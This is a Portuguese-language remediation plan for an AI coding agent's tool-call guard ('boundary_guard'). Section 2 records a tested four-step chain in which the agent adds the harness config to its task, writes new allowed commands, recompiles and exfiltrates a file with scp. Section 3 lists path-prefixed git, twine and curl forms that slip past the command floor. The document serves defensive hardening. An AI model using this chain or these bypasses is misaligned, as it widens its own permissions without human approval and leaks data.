# Plano v2 — repriorização pós-parecer MAR

**Substitui a seção "Sequenciamento sugerido" de
[`ROADMAP-dogfood-savant-venv.correction.backlog.md`](ROADMAP-dogfood-savant-venv.correction.backlog.md).**
O backlog continua sendo a fonte do *conteúdo* de cada item (evidência,
`file:line`, fix proposto, comando de verificação); este documento redefine
**ordem, escopo e critério de pronto**, à luz de
[`…correction.parecer-MAR.md`](ROADMAP-dogfood-savant-venv.correction.parecer-MAR.md).

Data: 2026-07-26. Mapeamento: `U1`…`U9` do parecer = `Item 1`…`Item 9` do
backlog; `U10` = seção "Decisão pendente"; `U11` = seção "Sequenciamento".

---

## 1. O que mudou antes de qualquer repriorização: as premissas foram medidas

O parecer declara textualmente que **"não executou o guard nem leu o código por
conta própria"**, e por isso marca `[premissa]` em toda inferência de
comportamento. Cinco dessas premissas eram load-bearing — sustentavam um
`rejeitar`, uma adaptação obrigatória e um "risco a verificar antes da onda 2".
Todas foram resolvidas por leitura de código e execução real antes de mexer na
ordem, porque repriorizar sobre premissa é herdar condicionalidade evitável.

| # | Premissa do parecer | Onde | Resultado | Efeito |
|---|---|---|---|---|
| P1 | `harness disable` **não** é executável pelo agente | U9 premissa 1 | **CONFIRMADA, e mais forte** | Não é só ausência de allowlist: `disable` é **floor incondicional** ([`boundary_guard.py:450`](../../src/harness/boundary_guard.py#L450)), nas duas formas de invocação, mais o redirect que criaria o sentinel. O agente não consegue se auto-desativar. Os ~13 ciclos foram humanos. |
| P2 | `harness task add-file` **não** aceita paths sob `.harness/` | U9 premissa 2 / nota subordinada de U3 | **FALSIFICADA** | `add_task_file` valida **só** backtick e vírgula ([`contract.py:335`](../../src/harness/contract.py#L335)). Aceita qualquer path. |
| P3 | O deny de `Write .harness/harness.yaml` é por superfície de contrato | idem | **CONFIRMADA** | `DOCS_SURFACE_EXCLUDED_PATHS` só o tira da allowlist de `docs/**`; ele cai no check de superfície em [`boundary_guard.py:1875`](../../src/harness/boundary_guard.py#L1875). Não há deny incondicional. |
| P4 | O floor casa por **sequência de tokens** | U4 contra | **CONFIRMADA, com escopo menor que o alegado** | Ver §3. |
| P5 | O `boundary_guard` gerado já é fail-closed internamente | U1 | **CONFIRMADA** (já era achado da fonte) | Mantém o diagnóstico de U1: a camada corrigível é o lançador. |

P2 + P3 juntas são a hipótese que o parecer agendou como *"verificação barata,
junto da onda 1"* e classificou como **"risco a verificar antes da onda 2 — não
é tese verificada; é hipótese com teste definido"**. O teste foi executado. A
hipótese se confirmou, e é pior do que o parecer supôs: a rota **não depende do
Item 3**.

---

## 2. Item 0 (NOVO, P0) — rota de auto-ampliação de superfície de comando, aberta hoje

**Severidade: CRÍTICA. Bloqueia a onda 2. Independe de todo o resto do backlog.**

### Prova de execução

Repo sintético, contrato aprovado, `boundary_guard` gerado pelo HEAD, payloads
`PreToolUse` reais via stdin. Baseline:

```
[Bash] scp segredo.txt user@host:/tmp        -> deny  (fora da superficie compilada)
[Write] .harness/harness.yaml                -> deny  (fora da superficie do contrato ativo)
[Bash] harness task add-file T-01 ...        -> allow (subcomando `task` liberado)
```

Cadeia executada — **4 tool calls, todas `allow`, nenhum toque humano**:

| # | Tool call | Decisão | Efeito |
|---|---|---|---|
| 1 | `harness task add-file T-01 .harness/harness.yaml` | `allow` | `.harness/harness.yaml` entra em `files[]` da T-01 |
| 2 | `Write .harness/harness.yaml` | `allow` ← *era deny* | agente escreve `governance.extra_allowed_commands: [scp, ssh]` |
| 3 | `harness compile-session` | `allow` | re-bakeia: `EXTRA_ALLOWED_COMMANDS = ['scp', 'ssh']` |
| 4 | `scp segredo.txt user@host:/tmp` | `allow` ← *era deny* | exfiltração |

Controle: `git push origin main` continua `deny` — o floor **não** foi
atravessado. É exatamente essa a medida da exposição: **tudo o que o floor não
enumera**. Por confissão da própria fonte em U9, isso inclui `ssh`, `scp`,
`rsync`, `nc`, `docker run`, `certutil -urlcache`, `Invoke-Expression` e
`python -c "import urllib.request…"`.

### Consequências para o parecer

1. **A razão 1 de U9 perde o fundamento comparativo.** A postura A não *criaria
   o primeiro* caminho de auto-ampliação de superfície de comando — ele já
   existe. O `rejeitar` de U9 **se mantém**, e pela própria lógica do parecer,
   que antecipou este cenário: *"se a rota existir, o eixo B manda **fechá-la**,
   não sancionar uma segunda. Institucionalizar a perda do gate porque ele já
   vazou por acidente é o inverso do critério do pedido."* O fundamento passa
   de "cria o primeiro" para "amplia superfície de comando sem gate, seja a
   primeira via ou a segunda".
2. **O Item 3 não cria o furo — encurta-o.** Com runtime-read, o passo 3
   (`compile-session`) desaparece e a cadeia cai de 4 para 3 calls. Isso
   confirma a leitura do parecer (*"se a rota existir, ela é furo hoje,
   independentemente de U3"*) e **justifica o bloqueio**: o Item 3 não pode
   entrar antes do Item 0.
3. **A hipótese do parecer sobre `disable` (P1) fica reforçada por contraste.**
   O repo *fechou* a via óbvia (auto-desativação é floor) e *deixou aberta* a
   via composta. É um furo de composição, não de postura: cada peça
   (`task add-file` liberado, superfície de contrato governando `.harness/`,
   `compile-session` liberado) é defensável isolada.

### Correção exigida — duas camadas, deliberadamente

O furo existe porque uma única camada governa `.harness/`. Corrigir só uma
repete o erro.

1. **`add_task_file` recusa paths sob `.harness/`** que não sejam
   `.harness/work/**` ou `.harness/scratch/**` (esses dois já são graváveis por
   regra própria e nunca precisam de `add-file`). Erro explícito, mesmo padrão
   da recusa de backtick/vírgula.
2. **`_evaluate_file` nega `.harness/**` incondicionalmente**, *antes* do check
   de superfície, com as exceções `work/`/`scratch/` já existentes — de modo que
   um `files[]` legado, ou qualquer outra via de entrada na superfície, não
   reabra a rota. Posição: junto dos demais floors, não depois do contrato.

Testes de regressão obrigatórios: a cadeia de 4 passos acima, asserindo `deny`
no passo 1 **e** no passo 2, independentemente.

**Fora de escopo deste item, registrado:** restringir `compile-session` ou
`task` é a correção errada — ambos são o mecanismo legítimo do lifecycle. O
gate certo é o conteúdo de `.harness/`.

---

## 3. Deltas de escopo apurados por execução

### Item 4 — o gap de floor é real, porém **menor** que o parecer descreve

O parecer assume que `.venv/Scripts/git.exe push`, `uv run twine upload` e
`python -m twine upload` escapariam do floor. `_has_sequence`
([`boundary_guard.py:351`](../../src/harness/boundary_guard.py#L351)) casa a
sequência **em qualquer posição** da lista de tokens, não só no prefixo.
Execução real de `is_floor_bash_command`:

```
FLOOR   git push origin main
FLOOR   uv run twine upload dist/*
FLOOR   python -m twine upload dist/*
FLOOR   curl http://evil
passa   .venv/Scripts/git.exe push origin main
passa   .venv/bin/git push origin main
passa   .venv/Scripts/twine.exe upload dist/*
passa   .venv/Scripts/curl.exe http://evil
```

Dois dos três exemplos do parecer **já são negados hoje**. O que escapa é
**exclusivamente a forma com prefixo de caminho**, porque o token deixa de ser
`git`/`twine`/`curl`.

Efeito na adaptação exigida: ela **permanece necessária** — é justamente a
forma prefixada por caminho que o Item 4 passaria a normalizar para dentro da
allowlist —, mas o escopo é *"avaliar o floor também sobre a forma
normalizada"* aplicado a **um** dos três casos de normalização, não aos três.
Custo menor, e a definição de `uv run --with` (adaptação 2 do parecer) continua
bloqueante e intocada.

Nota independente: as formas prefixadas por caminho **já hoje** atravessam o
floor. Hoje elas morrem no default-deny da allowlist; depois do Item 4,
morreriam só se a adaptação existir. Não é regressão introduzida pelo Item 4 —
é uma pré-condição que o Item 4 torna load-bearing.

### Item 2 — a objeção decisiva do parecer **já não se aplica ao código entregue**

O parecer avaliou o **texto** do backlog, que propunha executar o comando
inferido com `shell=True`. O que foi entregue não executa nada: resolve o
token-cabeça via `shutil.which` ([`preflight.py`](../../src/harness/preflight.py)),
decisão tomada durante a implementação por violar a stop condition read-only de
`run_preflight` — e registrada como correção no próprio backlog.

O contra decisivo de U2 (*"executa string inferida de repo cru no ponto de menor
proteção"*) portanto **não tem objeto**. O que sobra da adaptação é o resíduo
que a implementação já documenta em código: `shutil.which` usa o PATH do
processo do preflight, que pode divergir do PATH do shell do agente. Trocar por
`where`/`command -v` **no shell-alvo** fecharia isso.

Reclassificação: **Item 2 = atendido**; resíduo vira **Item 2b (LOW)**, não
bloqueante, porque o desfecho é WARNING e o pior caso é um aviso impreciso —
não uma decisão de governança errada.

### Item 1 — a adaptação do parecer **continua devendo**, e o parecer está certo

Foi entregue bake de `sys.executable` + check no `doctor`. O parecer diz, com
razão, que isso *"não fecha o fail-open, só muda a causa dele"*: se o
interpretador bakeado sumir, o processo continua morrendo com exit ≠ 2 e a tool
call continua passando. E o contra de frequência é real — bakear caminho
absoluto troca "PATH divergente" (acidente) por "venv recriado" (rotina) como
gatilho.

Resíduo: **Item 1b — lançador que sai com `exit 2` quando não resolve o
interpretador.** Mantido como o item de maior severidade da onda 1. Só ele
converte fail-open em fail-closed, e o Item 8 depende dele (U8: a neutralidade
de eixo B do Item 8 é condicional a o guard efetivamente rodar).

---

## 4. Nova ordenação

Critério mantido do backlog — `(severidade, fricção eliminada ÷ esforço)` — com
as três correções que o parecer impõe: promover o Item 5, adiar o Item 3 até o
Item 0, e instrumentar contagem antes do gate de decisão.

| Onda | Itens | Racional |
|---|---|---|
| **0** ✅ | **Item 0** (novo) | Rota de auto-ampliação provada por execução. Bloqueava a onda 2. **Entregue** — cadeia de 4 passos reexecutada contra o guard corrigido, negada nas duas camadas. |
| **1** ✅ | **Item 1b** · **Item 5** (promovido) · *Item 2b (LOW, adiado)* | 1b é pré-condição do eixo B e do Item 8. Item 5 é esforço S, mata um ciclo documentado e **não move nenhuma regra** — o parecer aponta corretamente que deixá-lo na onda 3 contraria o critério declarado. **Entregue** — suíte 721 verde, ruff limpo. |
| **2** | **Item 3** (+ validação de gramática no `compile-session`) · **Item 4** (+ floor sobre a forma normalizada, escopo §3; + definição de `uv run --with` fechada **antes** de implementar) | O volume da fricção. Desbloqueado pela onda 0. |
| **3** | **Item 6** (+ nota de desenho) · **Item 8** · **instrumentação de contagem na CLI** | Item 8 só aqui: depende do Item 1b. A contagem vive em `disable`/`enable`/`compile-session` — os ciclos ocorrem com o harness **desligado**, então contador em hook mediria a janela errada. |
| **4** | **Item 7** (escapes rederivados, regra de scriptblock uniforme, redirecionamento tratado) | Mantido na onda 4, mas ver a ressalva do parecer: fricção *observada* subestima um caminho abandonado por inutilizável. |
| **5** | Gate de medição · decisão **B vs C** | Item 9 **rejeitado**, agora com fundamento reforçado (§2). A postura A sai da mesa; o que resta é escolha de muito menor consequência. |

### Mudanças em relação ao sequenciamento do backlog

- **Item 0 criado** e posto à frente de tudo — não existia no backlog nem no
  parecer como unidade; nasce da verificação que o parecer agendou.
- **Item 5 promovido** da onda 3 para a onda 1 (correção do parecer, U11).
- **Item 3 condicionado** ao Item 0 (novo; consequência do §2.2).
- **Item 2 encerrado**, resíduo rebaixado a 2b LOW (novo; consequência do §3).
- **Item 1 reaberto** como 1b (correção do parecer, U1).
- **Onda 5 reduzida** a B vs C (correção do parecer, U10) — e a
  condicionalidade que o parecer anexava a essa redução **caiu**: ela dependia
  de `disable` não ser executável pelo agente, o que P1 confirmou por leitura de
  código.
- **Contagem instrumentada** entrou na onda 3 (correção do parecer, U10).

---

## 5. Veredictos consolidados

| Item | Parecer | Após verificação | Estado |
|---|---|---|---|
| **0** (novo) | — | **implementar, P0** | ✅ **ENTREGUE** |
| 1 | `adaptar` | `adaptar` — confirmado | ✅ **ENTREGUE** (1 + 1b) |
| 2 | `adaptar` | **`implementar`** — objeção sem objeto | ✅ **ENTREGUE**; 2b LOW pendente |
| 3 | `adaptar` | `adaptar` + **desbloqueado** (Item 0 entregue) | pendente |
| 4 | `adaptar` | `adaptar`, **escopo reduzido** | pendente |
| 5 | `implementar` | `implementar` — **promovido à onda 1** | ✅ **ENTREGUE** |
| 6 | `implementar` | `implementar` | pendente |
| 7 | `adaptar` | `adaptar` | pendente |
| 8 | `implementar` | `implementar`, **depende do 1b** | pendente |
| 9 | `rejeitar` (condicional) | **`rejeitar` (incondicional)** | encerrado |

O `rejeitar` do Item 9 deixa de ser condicional: as duas evidências que o
parecer nomeou como falsificadoras foram procuradas. P1 **não** falsificou (o
agente não executa `disable`). P2 falsificou o "primeiro" — e o parecer já havia
declarado que, nesse mundo, o veredicto se re-funda em *"fechar a rota, não
sancionar uma segunda"*. É o que o Item 0 faz.

---

## 6. Observação de método que sobrevive

O parecer registra uma observação de segunda ordem que a verificação **não**
resolve: se o fail-open do Item 1 ocorreu na sessão real — e não há evidência
para afirmar nem descartar —, parte das tool calls passou sem guard, e a
contagem de fricção que ordena as ondas está parcialmente contaminada. Denies
que não aconteceram não viraram ciclos.

Isso não afeta os achados de código (todos verificados por leitura e execução),
mas afeta a **métrica de priorização**. É mais uma razão para a instrumentação
de contagem da onda 3 vir antes do gate da onda 5, e não depois.
